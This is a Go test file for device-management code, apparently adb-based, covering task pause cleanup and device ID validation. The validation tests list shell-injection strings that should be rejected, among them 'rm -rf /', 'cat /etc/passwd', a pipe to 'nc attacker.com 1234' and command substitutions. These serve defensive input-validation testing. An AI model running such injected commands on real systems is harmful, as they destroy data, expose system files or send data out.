package main

import (
	"testing"
	"time"
)

// ========================================
// Task Pause/Resume Tests
// ========================================

func TestCleanupTaskPause(t *testing.T) {
	deviceId := "test-device-1"

	// Simulate pause state
	taskPauseMu.Lock()
	taskPauseSignal[deviceId] = make(chan struct{})
	taskIsPaused[deviceId] = true
	taskPauseMu.Unlock()

	// Verify pause state exists
	taskPauseMu.Lock()
	_, signalExists := taskPauseSignal[deviceId]
	_, pausedExists := taskIsPaused[deviceId]
	taskPauseMu.Unlock()

	if !signalExists || !pausedExists {
		t.Fatal("Expected pause state to exist before cleanup")
	}

	// Clean up
	cleanupTaskPause(deviceId)

	// Verify cleanup
	taskPauseMu.Lock()
	_, signalExists = taskPauseSignal[deviceId]
	_, pausedExists = taskIsPaused[deviceId]
	taskPauseMu.Unlock()

	if signalExists {
		t.Error("Expected taskPauseSignal to be deleted after cleanup")
	}
	if pausedExists {
		t.Error("Expected taskIsPaused to be deleted after cleanup")
	}
}

func TestCleanupTaskPauseUnblocksWaitingGoroutine(t *testing.T) {
	deviceId := "test-device-2"

	// Create pause state
	taskPauseMu.Lock()
	ch := make(chan struct{})
	taskPauseSignal[deviceId] = ch
	taskIsPaused[deviceId] = true
	taskPauseMu.Unlock()

	// Start a goroutine that waits on the channel
	done := make(chan bool)
	go func() {
		<-ch // This should block until cleanup closes the channel
		done <- true
	}()

	// Give the goroutine time to start waiting
	time.Sleep(10 * time.Millisecond)

	// Clean up should close the channel and unblock the goroutine
	cleanupTaskPause(deviceId)

	// Wait for the goroutine to complete (with timeout)
	select {
	case <-done:
		// Success - goroutine was unblocked
	case <-time.After(100 * time.Millisecond):
		t.Error("Cleanup did not unblock waiting goroutine")
	}
}

func TestCleanupTaskPauseIdempotent(t *testing.T) {
	deviceId := "test-device-3"

	// Create pause state
	taskPauseMu.Lock()
	taskPauseSignal[deviceId] = make(chan struct{})
	taskIsPaused[deviceId] = true
	taskPauseMu.Unlock()

	// First cleanup
	cleanupTaskPause(deviceId)

	// Second cleanup should not panic (idempotent)
	cleanupTaskPause(deviceId)

	// Third cleanup should also be safe
	cleanupTaskPause(deviceId)
}

func TestCleanupTaskPauseNoState(t *testing.T) {
	deviceId := "test-device-nonexistent"

	// Cleanup on non-existent device should not panic
	cleanupTaskPause(deviceId)
}

func TestCleanupTaskPausePartialState(t *testing.T) {
	deviceId := "test-device-4"

	// Only set isPaused without signal channel
	taskPauseMu.Lock()
	taskIsPaused[deviceId] = true
	taskPauseMu.Unlock()

	// Cleanup should handle partial state
	cleanupTaskPause(deviceId)

	taskPauseMu.Lock()
	_, pausedExists := taskIsPaused[deviceId]
	taskPauseMu.Unlock()

	if pausedExists {
		t.Error("Expected taskIsPaused to be deleted even without signal channel")
	}
}

// ========================================
// DeviceID Validation Tests
// ========================================

func TestValidateDeviceID(t *testing.T) {
	tests := []struct {
		name      string
		deviceID  string
		wantError bool
	}{
		// Valid device IDs
		{"USB serial", "1234567890ABCDEF", false},
		{"Emulator", "emulator-5554", false},
		{"Wireless IP:port", "192.168.1.100:5555", false},
		{"mDNS device", "adb-XXXXX._adb-tls-connect._tcp.", false},
		{"Simple alphanumeric", "device123", false},
		{"With underscore", "my_device_1", false},
		{"With dots", "device.local", false},
		{"IPv6 style", "::1:5555", false},

		// Invalid device IDs
		{"Empty", "", true},
		{"Too long", string(make([]byte, 300)), true},
		{"Shell injection semicolon", "device; rm -rf /", true},
		{"Shell injection &&", "device && cat /etc/passwd", true},
		{"Shell injection ||", "device || echo hacked", true},
		{"Shell injection pipe", "device | nc attacker.com 1234", true},
		{"Shell injection backtick", "device`whoami`", true},
		{"Shell injection $", "device$(id)", true},
		{"Shell injection parenthesis", "device()", true},
		{"Shell injection braces", "device{}", true},
		{"Shell injection redirect", "device > /tmp/out", true},
		{"Shell injection single quote", "device'test'", true},
		{"Shell injection double quote", "device\"test\"", true},
		{"Shell injection backslash", "device\\ntest", true},
		{"Newline", "device\ntest", true},
		{"Tab", "device\ttest", true},
		{"Space only", "   ", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateDeviceID(tt.deviceID)
			if (err != nil) != tt.wantError {
				t.Errorf("ValidateDeviceID(%q) error = %v, wantError = %v", tt.deviceID, err, tt.wantError)
			}
		})
	}
}

func TestMustValidateDeviceID(t *testing.T) {
	// Initialize logger to prevent nil pointer
	_ = InitLogger(DefaultLogConfig())

	// Valid device ID should return true
	if !MustValidateDeviceID("valid-device-123") {
		t.Error("Expected valid device ID to return true")
	}

	// Invalid device ID should return false
	if MustValidateDeviceID("device; rm -rf /") {
		t.Error("Expected invalid device ID to return false")
	}

	// Empty device ID should return false
	if MustValidateDeviceID("") {
		t.Error("Expected empty device ID to return false")
	}
}
